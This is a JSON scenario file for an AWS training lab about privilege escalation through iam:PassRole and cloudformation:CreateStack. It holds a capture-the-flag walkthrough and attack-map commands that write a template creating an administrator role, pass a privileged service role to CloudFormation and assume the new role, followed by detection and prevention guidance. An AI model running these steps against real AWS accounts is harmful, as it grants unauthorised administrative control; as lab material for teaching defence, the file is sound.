@@ -1,0 +1,224 @@
+{
+  "displayName": "CloudFormation Stack Creation to Admin",
+  "name": "cloudformation-001-iam-passrole-cloudformation",
+  "description": "CloudFormation stack creation with privileged service role to create escalated IAM roles",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "cloudformation-001",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Privilege Escalation",
+  "subCategory": "new-passrole",
+  "pathType": "one-hop",
+  "target": "to-admin",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0003 - Persistence"
+    ],
+    "techniques": [
+      "T1098.001 - Account Manipulation: Additional Cloud Credentials"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_admin_cloudformation_001_iam_passrole_cloudformation",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/cloudformation-001-iam-passrole-cloudformation"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/cloudformation-001-iam-passrole-cloudformation",
+  "schemaVersion": "4.6.0",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-cloudformation-001-to-admin-starting-user",
+        "required": [
+          {
+            "permission": "iam:PassRole",
+            "resource": "arn:aws:iam::*:role/pl-prod-cloudformation-001-to-admin-cfn-role",
+            "description": "allows passing the admin service role to CloudFormation"
+          },
+          {
+            "permission": "cloudformation:CreateStack",
+            "resource": "*",
+            "description": "allows creating a CloudFormation stack with the passed service role"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "cloudformation:DescribeStacks",
+            "purpose": "monitor stack creation progress"
+          },
+          {
+            "permission": "iam:ListRoles",
+            "purpose": "discover available privileged roles to pass"
+          },
+          {
+            "permission": "cloudformation:DeleteStack",
+            "purpose": "clean up attack artifacts"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-cloudformation-001-to-admin-starting-user` IAM user to the `pl-prod-cloudformation-001-to-admin-escalated-role` administrative role by passing a privileged CloudFormation service role and creating a stack with a malicious template that provisions a new admin role you can assume.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-cloudformation-001-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-cloudformation-001-to-admin-escalated-role`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew tap DataDog/pathfinding-labs https://github.com/DataDog/pathfinding-labs\n   brew install DataDog/pathfinding-labs/plabs\n   ```\n   Or with Go 1.25+ installed:\n   ```bash\n   go install github.com/DataDog/pathfinding-labs/cmd/plabs@latest\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable cloudformation-001-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `cloudformation-001-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-cloudformation-001-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:role/pl-prod-cloudformation-001-to-admin-cfn-role` | Privileged role with AdministratorAccess, trusted by cloudformation.amazonaws.com |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Create a CloudFormation stack with a malicious template\n4. Pass the admin role to CloudFormation as the service role\n5. Create a new escalated IAM role via CloudFormation\n6. Assume the newly created role\n7. Verify successful privilege escalation",
+        "resourcesCreated": "- A CloudFormation stack containing a malicious template\n- `pl-prod-cloudformation-001-to-admin-escalated-role` -- new IAM role with AdministratorAccess created by the stack",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo cloudformation-001-iam-passrole-cloudformation\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `cloudformation-001-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup cloudformation-001-iam-passrole-cloudformation\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `cloudformation-001-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable cloudformation-001-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `cloudformation-001-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- User with ability to pass privileged roles to CloudFormation (`iam:PassRole` on admin roles + `cloudformation:CreateStack`)\n- Combined permissions creating privilege escalation path (PassRole + CreateStack on same principal)\n- User with unrestricted CloudFormation stack creation capabilities\n- Potential for privilege escalation via CloudFormation service abuse\n- CloudFormation service role with IAM creation permissions\n- `iam:PassRole` permission with wildcards or broad resource specifications targeting CloudFormation-trusted roles\n- Roles trusted by cloudformation.amazonaws.com with `iam:CreateRole` or `iam:AttachRolePolicy` permissions",
+        "prevention": "- **Restrict PassRole permissions**: Never grant `iam:PassRole` with wildcards. Use resource-based conditions to limit which roles can be passed and to which services (use `iam:PassedToService` condition key to restrict to specific services)\n- **Limit CloudFormation service roles**: CloudFormation service roles should follow least privilege. Avoid granting them administrative IAM permissions\n- **Separate CloudFormation permissions**: Avoid granting `cloudformation:CreateStack` and `cloudformation:UpdateStack` to principals that have `iam:PassRole` on privileged roles\n- **Implement permission boundaries**: Use IAM permission boundaries to prevent roles from being passed to CloudFormation if they contain sensitive IAM creation permissions\n- **Use SCPs**: Implement Service Control Policies to prevent passing of admin roles to infrastructure services (CloudFormation, Terraform Cloud, etc.)\n- **Require stack policies**: Enforce CloudFormation stack policies that restrict IAM resource creation or require approval workflows\n- **Template validation**: Implement automated CloudFormation template scanning to detect IAM resources with overly permissive policies\n- **Use IAM Access Analyzer**: Leverage IAM Access Analyzer to identify privilege escalation paths involving CloudFormation\n- **Require MFA**: Enforce MFA for sensitive operations like creating CloudFormation stacks with privileged service roles\n- **Implement approval workflows**: Use AWS Service Catalog or custom approval gates for CloudFormation deployments with elevated permissions"
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `cloudformation:CreateStack` -- new CloudFormation stack created; inspect the `roleARN` field in request parameters \u2014 a privileged role ARN here is the CloudTrail signal for PassRole to CloudFormation; high severity when the role has elevated IAM permissions\n- `cloudformation:UpdateStack` -- existing stack updated; monitor for IAM resource additions with privileged policies\n- `sts:AssumeRole` -- role assumption following stack creation; suspicious when the assumed role was recently created via CloudFormation",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [AWS Documentation - IAM PassRole](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html) -- AWS documentation on how iam:PassRole works and its security implications\n- [AWS CloudFormation Service Role](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-servicerole.html) -- AWS documentation on CloudFormation service roles\n- [Rhino Security Labs - AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) -- comprehensive overview of IAM privilege escalation techniques\n- [AWS Security Best Practices for CloudFormation](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/security-best-practices.html) -- AWS security guidance for CloudFormation deployments",
+    "solution": "# Guided Walkthrough: One-Hop Privilege Escalation via iam:PassRole + cloudformation:CreateStack\n\nThis scenario demonstrates a privilege escalation vulnerability where a user has permission to pass IAM roles to AWS CloudFormation (`iam:PassRole`) and create CloudFormation stacks (`cloudformation:CreateStack`). The attacker creates a CloudFormation stack with a malicious template that defines a new IAM role with administrative permissions and a trust policy allowing the attacker to assume it. By passing a privileged role to CloudFormation as the service role, the attacker leverages CloudFormation's elevated permissions to create resources they couldn't create directly.\n\nThe attack works by exploiting the CloudFormation service's ability to create and manage AWS resources on behalf of users. When CloudFormation executes with an administrative service role, it can create any AWS resource defined in the template, including IAM roles with privileged policies and custom trust relationships. The attacker crafts a template that creates a backdoor admin role, and CloudFormation provisions it using the passed admin role's permissions.\n\nThis technique is particularly dangerous because CloudFormation is often granted broad permissions to provision infrastructure, and developers are frequently given CloudFormation access without understanding the privilege escalation implications. The combination of `iam:PassRole` and `cloudformation:CreateStack` creates a complete path to admin access through infrastructure-as-code abuse.\n\n## The Challenge\n\nYou start as `pl-prod-cloudformation-001-to-admin-starting-user`, an IAM user with two specific permissions: `iam:PassRole` on the role `pl-prod-cloudformation-001-to-admin-cfn-role`, and `cloudformation:CreateStack` on all resources. You cannot directly create IAM roles, attach policies, or perform any other IAM write actions.\n\nYour goal is to reach `pl-prod-cloudformation-001-to-admin-escalated-role` \u2014 a new role with `AdministratorAccess` that does not exist yet. You must create it by abusing CloudFormation's ability to provision AWS resources on your behalf using a privileged service role.\n\nCredentials for the starting user are available in the Terraform outputs under the key `single_account_privesc_one_hop_to_admin_cloudformation_001_iam_passrole_cloudformation`.\n\n## Reconnaissance\n\nFirst, confirm your identity and verify you cannot perform admin actions directly:\n\n```bash\naws sts get-caller-identity\n# Should show pl-prod-cloudformation-001-to-admin-starting-user\n\naws iam list-users\n# Should fail with AccessDenied\n```\n\nNext, look at what roles are available to pass. You have `iam:PassRole` on a specific role \u2014 let's confirm it exists and understand what permissions it has:\n\n```bash\naws iam get-role --role-name pl-prod-cloudformation-001-to-admin-cfn-role\n# Note the trust policy: cloudformation.amazonaws.com is the trusted service\n\naws iam list-attached-role-policies --role-name pl-prod-cloudformation-001-to-admin-cfn-role\n# Should show AdministratorAccess attached\n```\n\nThe service role trusts `cloudformation.amazonaws.com` and has `AdministratorAccess`. That means if you pass it to a CloudFormation stack, the stack can create any resource \u2014 including IAM roles \u2014 using admin permissions.\n\n## Exploitation\n\n### Step 1: Craft a Malicious CloudFormation Template\n\nWrite a template that defines an IAM role with `AdministratorAccess`. The trust policy should allow your starting user to assume the role:\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\n\ncat > /tmp/cfn-cloudformation-001-escalation-template.yaml <<EOF\nAWSTemplateFormatVersion: '2010-09-09'\nDescription: 'Privilege Escalation - Creates an admin role that trusts the starting user'\n\nResources:\n  EscalatedRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: pl-prod-cloudformation-001-to-admin-escalated-role\n      Description: 'Escalated role created via CloudFormation PassRole attack'\n      AssumeRolePolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Effect: Allow\n            Principal:\n              AWS: arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-cloudformation-001-to-admin-starting-user\n            Action: sts:AssumeRole\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/AdministratorAccess\n\nOutputs:\n  EscalatedRoleArn:\n    Value: !GetAtt EscalatedRole.Arn\nEOF\n```\n\n### Step 2: Create the Stack with the Privileged Service Role\n\nThis is the key step. By specifying `--role-arn`, you pass the admin service role to CloudFormation. CloudFormation will use that role to provision every resource in the template \u2014 including the new IAM role your starting user cannot create directly:\n\n```bash\naws cloudformation create-stack \\\n  --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack \\\n  --template-body file:///tmp/cfn-cloudformation-001-escalation-template.yaml \\\n  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-cloudformation-001-to-admin-cfn-role \\\n  --capabilities CAPABILITY_NAMED_IAM\n```\n\nWait for the stack to finish:\n\n```bash\naws cloudformation wait stack-create-complete \\\n  --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack\n```\n\n### Step 3: Assume the Escalated Role\n\nOnce the stack is `CREATE_COMPLETE`, the escalated role exists and trusts your starting user. Assume it:\n\n```bash\nESCALATED_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-cloudformation-001-to-admin-escalated-role\"\n\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn $ESCALATED_ROLE_ARN \\\n  --role-session-name escalation-demo \\\n  --query 'Credentials' \\\n  --output json)\n\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')\n```\n\n## Verification\n\nConfirm you now have administrator access:\n\n```bash\naws sts get-caller-identity\n# Should show pl-prod-cloudformation-001-to-admin-escalated-role\n\naws iam list-users\n# Should succeed and list all IAM users in the account\n```\n\n## Capture the Flag\n\nWith the escalated role's session credentials active, you now hold `AdministratorAccess`. This implicitly grants `ssm:GetParameter` on all parameters in the account. Read the scenario flag:\n\n```bash\naws ssm get-parameter \\\n    --name /pathfinding-labs/flags/cloudformation-001-to-admin \\\n    --query 'Parameter.Value' \\\n    --output text\n# flag{...}  \u2014 your scenario-specific flag value\n```\n\nThe value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them \u2014 only the scenario ID in the path changes.\n\n## What Happened\n\nYou exploited a well-known privilege escalation pattern: using `iam:PassRole` to delegate admin permissions to an AWS service, then using that service to create resources you could not create directly. CloudFormation is a particularly powerful target for this technique because infrastructure-as-code workflows are common, and passing roles to CloudFormation is standard operational practice \u2014 making the combination easy to overlook during IAM reviews.\n\nThe attack mirrors real-world scenarios where developers are granted CloudFormation access to deploy infrastructure without their security team realizing that passing an admin service role to CloudFormation is functionally equivalent to having `iam:CreateRole` + `iam:AttachRolePolicy` themselves. Preventing this requires either restricting the service roles that can be passed, or separating the principals that have `iam:PassRole` from those that have `cloudformation:CreateStack`.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-user",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-001-to-admin-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole permission on the CloudFormation service role (pl-prod-cloudformation-001-to-admin-cfn-role) and cloudformation:CreateStack on all resources \u2014 a combination that enables privilege escalation via infrastructure-as-code abuse.\n"
+      },
+      {
+        "id": "cfn-stack",
+        "label": "CloudFormation Stack",
+        "type": "resource",
+        "subType": "cloudformation-stack",
+        "arn": "arn:aws:cloudformation:{region}:{account_id}:stack/pl-prod-cloudformation-001-to-admin-escalation-stack/*",
+        "description": "A CloudFormation stack created by the attacker using a malicious template. The stack is deployed with pl-prod-cloudformation-001-to-admin-cfn-role as the service role, granting CloudFormation administrative permissions to provision any resource defined in the template \u2014 including IAM roles with arbitrary trust policies and permission policies.\n"
+      },
+      {
+        "id": "escalated-role",
+        "label": "Escalated Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-001-to-admin-escalated-role",
+        "description": "A new IAM role with AdministratorAccess created by the CloudFormation stack. The trust policy on this role allows the starting user to assume it directly, granting full administrative access to the AWS account.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/cloudformation-001-to-admin",
+        "description": "The CTF flag for this scenario, stored as an SSM parameter in the victim account. Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is granted implicitly by AdministratorAccess). Your goal is to read this parameter using the admin access gained by assuming the escalated role.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-user",
+        "to": "cfn-stack",
+        "label": "iam:PassRole + cloudformation:CreateStack",
+        "description": "The starting user passes the privileged CFN service role to CloudFormation and creates a stack with a malicious template. CloudFormation executes the template using the admin service role's permissions.\n",
+        "hints": [
+          "Pass the privileged CFN service role via --role-arn on cloudformation:CreateStack with a template that creates an AdministratorAccess role trusted by your starting user. Include --capabilities CAPABILITY_NAMED_IAM for named IAM resources.",
+          "Poll cloudformation:DescribeStacks until CREATE_COMPLETE before assuming the newly provisioned role \u2014 stack creation takes 30-60 seconds.",
+          "Browse to https://pathfinding.cloud/paths/cloudformation-001 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Create a malicious CloudFormation template that defines an admin role",
+            "command": "cat > /tmp/cfn-cloudformation-001-escalation-template.yaml <<EOF\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  EscalatedRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: pl-prod-cloudformation-001-to-admin-escalated-role\n      AssumeRolePolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Effect: Allow\n            Principal:\n              AWS: arn:aws:iam::ACCOUNT_ID:user/pl-prod-cloudformation-001-to-admin-starting-user\n            Action: sts:AssumeRole\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/AdministratorAccess\nEOF\n"
+          },
+          {
+            "description": "Create the CloudFormation stack with the privileged service role",
+            "command": "aws cloudformation create-stack --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack --template-body file:///tmp/cfn-cloudformation-001-escalation-template.yaml --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-001-to-admin-cfn-role --capabilities CAPABILITY_NAMED_IAM"
+          },
+          {
+            "description": "Wait for the stack to complete",
+            "command": "aws cloudformation wait stack-create-complete --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack"
+          }
+        ]
+      },
+      {
+        "from": "cfn-stack",
+        "to": "escalated-role",
+        "label": "CloudFormation provisions IAM role",
+        "description": "CloudFormation, running with the admin service role's permissions, provisions the IAM role defined in the malicious template. The resulting role has AdministratorAccess and trusts the starting user.\n",
+        "hints": [],
+        "commands": []
+      },
+      {
+        "from": "starting-user",
+        "to": "escalated-role",
+        "label": "sts:AssumeRole",
+        "description": "The starting user assumes the newly created escalated role, obtaining administrative credentials for the AWS account.\n",
+        "hints": [
+          "Wait at least 15 seconds after CREATE_COMPLETE for IAM propagation, then assume the role with sts:AssumeRole and export the returned credentials."
+        ],
+        "commands": [
+          {
+            "description": "Assume the escalated role created by CloudFormation",
+            "command": "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-001-to-admin-escalated-role --role-session-name privesc-session"
+          },
+          {
+            "description": "Verify administrator access",
+            "command": "aws iam list-users"
+          }
+        ]
+      },
+      {
+        "from": "escalated-role",
+        "to": "ctf-flag",
+        "label": "ssm:GetParameter",
+        "description": "With administrator-equivalent permissions obtained by assuming the escalated role, retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all parameters in the account, so no additional permissions are needed beyond the admin access you just gained.\n",
+        "hints": [
+          "Use ssm:GetParameter with the parameter name /pathfinding-labs/flags/cloudformation-001-to-admin to retrieve the flag."
+        ],
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag from SSM Parameter Store",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/cloudformation-001-to-admin --query 'Parameter.Value' --output text"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "iam",
+    "cloudformation"
+  ],
+  "slug": "cloudformation-001",
+  "hasDemoTranscript": true
+}
